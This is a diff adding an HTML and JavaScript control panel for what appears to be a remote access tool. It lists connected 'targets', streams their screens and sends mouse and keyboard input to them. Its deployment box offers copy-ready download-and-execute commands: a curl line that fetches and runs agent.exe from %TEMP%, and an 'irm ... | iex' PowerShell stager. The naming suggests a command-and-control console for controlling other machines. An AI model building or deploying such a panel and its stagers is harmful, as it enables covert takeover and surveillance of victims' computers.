@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AK-SES</title>
+    <style>
+        :root {
+            --bg: #545e60;
+            --pane-bg: #2a3536;
+            --mid: #162326;
+            --fg: #ebe6ca;
+            --lnclr: #cdccb2;
+            --acc: #97b1aa;
+            --onl: #4ade80;
+            --dngr: #ef4444;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            border-radius: 3px;
+            font-family: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--fg);
+            display: flex;
+            height: 100vh;
+            overflow: hidden;
+            font-size: 13px;
+        }
+
+        /* SIDEBAR */
+        #sdbr {
+            width: 320px;
+            min-width: 320px;
+            background-color: var(--pane-bg);
+            border-right: 1px solid var(--lnclr);
+            display: flex;
+            flex-direction: column;
+            border-radius: 0;
+        }
+
+        .hdr {
+            padding: 14px 16px;
+            background: var(--mid);
+            border-bottom: 1px solid var(--lnclr);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-radius: 0;
+        }
+
+        .hdr-ttl {
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            color: var(--fg);
+        }
+
+        .hdr-sub {
+            font-size: 10px;
+            color: var(--lnclr);
+            opacity: 0.7;
+            font-family: ui-monospace, monospace;
+        }
+
+        /* SECTION HEADERS */
+        .sctn-lbl {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-weight: 600;
+            opacity: 0.7;
+            color: var(--fg);
+            margin-bottom: 6px;
+        }
+
+        /* DEPLOYMENT PANE */
+        .dply-box {
+            padding: 10px 12px;
+            border-bottom: 1px solid var(--lnclr);
+            background: rgba(0, 0, 0, 0.15);
+            border-radius: 0;
+        }
+
+        .tb-nav {
+            display: flex;
+            gap: 4px;
+            margin-bottom: 6px;
+        }
+
+        .tb-btn {
+            background: var(--mid);
+            color: var(--fg);
+            border: 1px solid var(--lnclr);
+            padding: 3px 8px;
+            font-size: 11px;
+            font-weight: 600;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        .tb-btn.active {
+            background: var(--acc);
+            color: var(--mid);
+            border-color: var(--fg);
+        }
+
+        .cde-box {
+            background: var(--mid);
+            border: 1px solid var(--lnclr);
+            padding: 8px;
+            font-family: ui-monospace, "Cascadia Code", monospace;
+            font-size: 11px;
+            color: var(--acc);
+            word-break: break-all;
+            user-select: all;
+            cursor: pointer;
+            margin-bottom: 4px;
+        }
+
+        .cde-box:hover {
+            filter: brightness(1.15);
+        }
+
+        /* TARGETS LIST */
+        #tgt-lst {
+            flex: 1;
+            overflow-y: auto;
+            padding: 10px;
+            list-style: none;
+            scrollbar-width: thin;
+        }
+
+        .tgt-itm {
+            background: var(--mid);
+            border: 1px solid var(--lnclr);
+            padding: 8px 10px;
+            margin-bottom: 6px;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: filter .15s ease;
+        }
+
+        .tgt-itm:hover {
+            filter: brightness(1.2);
+        }
+
+        .tgt-itm.active {
+            background: var(--acc);
+            color: var(--mid);
+            border-color: var(--fg);
+            font-weight: 700;
+        }
+
+        .tgt-itm.active .tgt-dtls {
+            color: var(--mid);
+            opacity: 0.85;
+        }
+
+        .tgt-nm {
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .tgt-dtls {
+            font-size: 10px;
+            color: var(--lnclr);
+            opacity: 0.7;
+            font-family: ui-monospace, monospace;
+            margin-top: 2px;
+        }
+
+        /* STATUS DOT */
+        .st-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #666;
+            flex-shrink: 0;
+        }
+
+        .st-dot.active {
+            background: var(--onl);
+            box-shadow: 0 0 5px var(--onl);
+        }
+
+        /* MAIN VIEWPORT */
+        #main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            background: var(--mid);
+            position: relative;
+            border-radius: 0;
+        }
+
+        /* TOPBAR */
+        #tpbr {
+            height: 42px;
+            background: var(--pane-bg);
+            border-bottom: 1px solid var(--lnclr);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 14px;
+            border-radius: 0;
+        }
+
+        .st-lbl {
+            font-size: 11px;
+            font-family: ui-monospace, monospace;
+            color: var(--fg);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .actn-grp {
+            display: flex;
+            gap: 6px;
+        }
+
+        button {
+            background: var(--mid);
+            color: var(--fg);
+            border: 1px solid var(--lnclr);
+            padding: 5px 10px;
+            font-size: 11px;
+            font-weight: 600;
+            cursor: pointer;
+            text-transform: uppercase;
+            white-space: nowrap;
+            transition: filter .15s ease;
+        }
+
+        button:hover:not(:disabled) {
+            filter: brightness(1.2);
+        }
+
+        button.active {
+            background: var(--acc);
+            color: var(--mid);
+            border-color: var(--fg);
+            font-weight: 700;
+        }
+
+        /* CANVAS STAGE */
+        #cnvs-cntnr {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            position: relative;
+            background: #0d1517;
+        }
+
+        canvas {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+            border: 1px solid var(--lnclr);
+            cursor: default;
+        }
+
+        canvas.ctrl-on {
+            cursor: crosshair;
+        }
+
+        #plchldr {
+            position: absolute;
+            color: var(--lnclr);
+            font-size: 12px;
+            font-family: ui-monospace, monospace;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            opacity: 0.6;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- SIDEBAR -->
+    <div id="sdbr">
+        <div class="hdr">
+            <div>
+                <div class="hdr-ttl">AK-SES // RDP</div>
+                <div class="hdr-sub">SYS_ADM_V1</div>
+            </div>
+            <div class="st-dot active" title="srv_st: onl"></div>
+        </div>
+
+        <!-- DEPLOYMENT CMD -->
+        <div class="dply-box">
+            <div class="sctn-lbl">DPLY_TGT</div>
+            <div class="tb-nav">
+                <button class="tb-btn active" id="btn-tb-cmd" onclick="swtch_tb('cmd')">CMD</button>
+                <button class="tb-btn" id="btn-tb-ps" onclick="swtch_tb('ps')">PS1</button>
+            </div>
+            <div id="cde-bx" class="cde-box" onclick="cp_cde()" title="CLICK_TO_CP">...</div>
+        </div>
+
+        <!-- TARGETS -->
+        <div style="padding: 10px 12px 0 12px;">
+            <div class="sctn-lbl">TGTS_ACTV</div>
+        </div>
+        <ul id="tgt-lst"></ul>
+    </div>
+
+    <!-- MAIN -->
+    <div id="main">
+        <div id="tpbr">
+            <div class="st-lbl" id="st-txt">NO_TGT_SLCTD</div>
+            <div class="actn-grp">
+                <div id="disp-grp" style="display:inline-flex; gap:3px;"></div>
+                <button id="btn-ctrl" onclick="tgl_ctrl()">[ CTRL: OFF ]</button>
+                <button onclick="snd_spc_ky('Enter')">[ ENTER ]</button>
+                <button onclick="snd_spc_ky('Backspace')">[ BKSP ]</button>
+                <button onclick="snd_spc_ky('Escape')">[ ESC ]</button>
+            </div>
+        </div>
+
+        <div id="cnvs-cntnr">
+            <div id="plchldr">[ IDLE_WAITING_STREAM ]</div>
+            <canvas id="scrn-cnvs" tabindex="0"></canvas>
+        </div>
+    </div>
+
+    <script>
+        const hst = window.location.host;
+        let cur_tb = 'cmd';
+        let cur_tgt_id = null;
+        let ws_adm = null;
+        let ctrl_on = false;
+        let cur_disp = 0;
+        let cur_disps = [];
+
+        const cnvs = document.getElementById('scrn-cnvs');
+        const ctx = cnvs.getContext('2d');
+        const plchldr = document.getElementById('plchldr');
+        const st_txt = document.getElementById('st-txt');
+        const btn_ctrl = document.getElementById('btn-ctrl');
+        const cde_bx = document.getElementById('cde-bx');
+        const disp_grp = document.getElementById('disp-grp');
+
+        function upd_cde() {
+            if (cur_tb === 'cmd') {
+                cde_bx.innerText = `curl -s -o %TEMP%\\agent.exe http://${hst}/dl/agent.exe && %TEMP%\\agent.exe -server ${hst}`;
+            } else {
+                cde_bx.innerText = `irm http://${hst}/dl/run.ps1 | iex`;
+            }
+        }
+        upd_cde();
+
+        function swtch_tb(tb) {
+            cur_tb = tb;
+            document.getElementById('btn-tb-cmd').classList.toggle('active', tb === 'cmd');
+            document.getElementById('btn-tb-ps').classList.toggle('active', tb === 'ps');
+            upd_cde();
+        }
+
+        function cp_cde() {
+            navigator.clipboard.writeText(cde_bx.innerText);
+            const prv = cde_bx.innerText;
+            cde_bx.innerText = '[ COPIED_TO_CLIPBOARD ]';
+            setTimeout(() => { cde_bx.innerText = prv; }, 1000);
+        }
+
+        async function rfrsh_tgts() {
+            try {
+                const res = await fetch('/api/agents');
+                const lst = await res.json();
+                const cntnr = document.getElementById('tgt-lst');
+                cntnr.innerHTML = '';
+
+                if (lst.length === 0) {
+                    cntnr.innerHTML = '<li style="padding:10px; color:var(--lnclr); font-size:11px; opacity:0.6; text-transform:uppercase;">[ NO_TGT_CONN ]</li>';
+                }
+
+                lst.forEach(a => {
+                    const li = document.createElement('li');
+                    li.className = 'tgt-itm' + (a.id === cur_tgt_id ? ' active' : '');
+                    li.innerHTML = `
+                        <div>
+                            <div class="tgt-nm">${a.hostname || a.id}</div>
+                            <div class="tgt-dtls">id:${a.id} // ${a.os}</div>
+                        </div>
+                        <div class="st-dot active"></div>
+                    `;
+                    li.onclick = () => slct_tgt(a.id);
+                    cntnr.appendChild(li);
+                });
+            } catch (e) {
+                console.error(e);
+            }
+        }
+
+        setInterval(rfrsh_tgts, 3000);
+        rfrsh_tgts();
+
+        function slct_tgt(id) {
+            if (cur_tgt_id === id && ws_adm) return;
+            cur_tgt_id = id;
+            rfrsh_tgts();
+
+            if (ws_adm) ws_adm.close();
+
+            st_txt.innerText = `CONN_REQ: ${id}`;
+            plchldr.style.display = 'block';
+            plchldr.innerText = '[ STREAM_SYNC... ]';
+
+            const prtcl = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            ws_adm = new WebSocket(`${prtcl}//${hst}/ws/admin?id=${id}`);
+            ws_adm.binaryType = 'blob';
+
+            ws_adm.onopen = () => {
+                st_txt.innerText = `ACTIVE_TGT: ${id}`;
+            };
+
+            ws_adm.onmessage = async (evt) => {
+                if (evt.data instanceof Blob) {
+                    const bmp = await createImageBitmap(evt.data);
+                    plchldr.style.display = 'none';
+
+                    if (cnvs.width !== bmp.width || cnvs.height !== bmp.height) {
+                        cnvs.width = bmp.width;
+                        cnvs.height = bmp.height;
+                    }
+                    ctx.drawImage(bmp, 0, 0);
+                } else if (typeof evt.data === 'string') {
+                    try {
+                        const msg = JSON.parse(evt.data);
+                        if (msg.type === 'displays') {
+                            render_disps(msg.displays);
+                        }
+                    } catch (e) {}
+                }
+            };
+
+            ws_adm.onclose = () => {
+                st_txt.innerText = `DISCONN: ${id}`;
+                plchldr.style.display = 'block';
+                plchldr.innerText = '[ TGT_LOST ]';
+            };
+        }
+
+        function render_disps(disps) {
+            cur_disps = disps || [];
+            disp_grp.innerHTML = '';
+            if (cur_disps.length <= 1) return;
+
+            cur_disps.forEach((d) => {
+                const b = document.createElement('button');
+                b.innerText = `[ SCRN ${d.index + 1} ]`;
+                b.className = (d.index === cur_disp ? 'active' : '');
+                b.onclick = () => swtch_disp(d.index);
+                disp_grp.appendChild(b);
+            });
+        }
+
+        function swtch_disp(idx) {
+            cur_disp = idx;
+            document.querySelectorAll('#disp-grp button').forEach((b, i) => {
+                b.classList.toggle('active', i === idx);
+            });
+            if (ws_adm && ws_adm.readyState === WebSocket.OPEN) {
+                ws_adm.send(JSON.stringify({ type: 'select_display', display: idx }));
+            }
+        }
+
+        function tgl_ctrl() {
+            ctrl_on = !ctrl_on;
+            if (ctrl_on) {
+                btn_ctrl.classList.add('active');
+                btn_ctrl.innerText = '[ CTRL: ON ]';
+                cnvs.classList.add('ctrl-on');
+                cnvs.focus();
+            } else {
+                btn_ctrl.classList.remove('active');
+                btn_ctrl.innerText = '[ CTRL: OFF ]';
+                cnvs.classList.remove('ctrl-on');
+            }
+        }
+
+        function get_crds(e) {
+            const rc = cnvs.getBoundingClientRect();
+            const x = (e.clientX - rc.left) / rc.width;
+            const y = (e.clientY - rc.top) / rc.height;
+            return { x: Math.max(0, Math.min(1, x)), y: Math.max(0, Math.min(1, y)) };
+        }
+
+        cnvs.addEventListener('mousemove', (e) => {
+            if (!ctrl_on || !ws_adm || ws_adm.readyState !== WebSocket.OPEN) return;
+            const pt = get_crds(e);
+            ws_adm.send(JSON.stringify({ type: 'mouse_move', display: cur_disp, x: pt.x, y: pt.y }));
+        });
+
+        cnvs.addEventListener('mousedown', (e) => {
+            if (!ctrl_on || !ws_adm || ws_adm.readyState !== WebSocket.OPEN) return;
+            e.preventDefault();
+            const pt = get_crds(e);
+            const btns = ['left', 'middle', 'right'];
+            ws_adm.send(JSON.stringify({
+                type: 'mouse_down',
+                display: cur_disp,
+                button: btns[e.button] || 'left',
+                x: pt.x,
+                y: pt.y
+            }));
+        });
+
+        cnvs.addEventListener('mouseup', (e) => {
+            if (!ctrl_on || !ws_adm || ws_adm.readyState !== WebSocket.OPEN) return;
+            e.preventDefault();
+            const pt = get_crds(e);
+            const btns = ['left', 'middle', 'right'];
+            ws_adm.send(JSON.stringify({
+                type: 'mouse_up',
+                display: cur_disp,
+                button: btns[e.button] || 'left',
+                x: pt.x,
+                y: pt.y
+            }));
+        });
+
+        cnvs.addEventListener('wheel', (e) => {
+            if (!ctrl_on || !ws_adm || ws_adm.readyState !== WebSocket.OPEN) return;
+            e.preventDefault();
+            const dlt = e.deltaY > 0 ? -120 : 120;
+            ws_adm.send(JSON.stringify({ type: 'mouse_scroll', deltaY: dlt }));
+        });
+
+        cnvs.addEventListener('contextmenu', (e) => {
+            if (ctrl_on) e.preventDefault();
+        });
+
+        const VK_MAP = {
+            'Enter': 0x0D,
+            'Backspace': 0x08,
+            'Tab': 0x09,
+            'Escape': 0x1B,
+            'Space': 0x20,
+            'ArrowLeft': 0x25,
+            'ArrowUp': 0x26,
+            'ArrowRight': 0x27,
+            'ArrowDown': 0x28,
+            'Delete': 0x2E,
+            'ShiftLeft': 0x10,
+            'ShiftRight': 0x10,
+            'ControlLeft': 0x11,
+            'ControlRight': 0x11,
+            'AltLeft': 0x12,
+            'AltRight': 0x12
+        };
+
+        window.addEventListener('keydown', (e) => {
+            if (!ctrl_on || !ws_adm || ws_adm.readyState !== WebSocket.OPEN) return;
+            if (VK_MAP[e.code]) {
+                e.preventDefault();
+                ws_adm.send(JSON.stringify({ type: 'key_down', code: VK_MAP[e.code] }));
+            } else if (e.key.length === 1 && !e.ctrlKey && !e.altKey) {
+                ws_adm.send(JSON.stringify({ type: 'key_text', text: e.key }));
+            }
+        });
+
+        window.addEventListener('keyup', (e) => {
+            if (!ctrl_on || !ws_adm || ws_adm.readyState !== WebSocket.OPEN) return;
+            if (VK_MAP[e.code]) {
+                ws_adm.send(JSON.stringify({ type: 'key_up', code: VK_MAP[e.code] }));
+            }
+        });
+
+        function snd_spc_ky(ky) {
+            if (!ws_adm || ws_adm.readyState !== WebSocket.OPEN) return;
+            const cde = VK_MAP[ky];
+            if (cde) {
+                ws_adm.send(JSON.stringify({ type: 'key_down', code: cde }));
+                setTimeout(() => {
+                    ws_adm.send(JSON.stringify({ type: 'key_up', code: cde }));
+                }, 50);
+            }
+        }
+    </script>
+</body>
+</html>
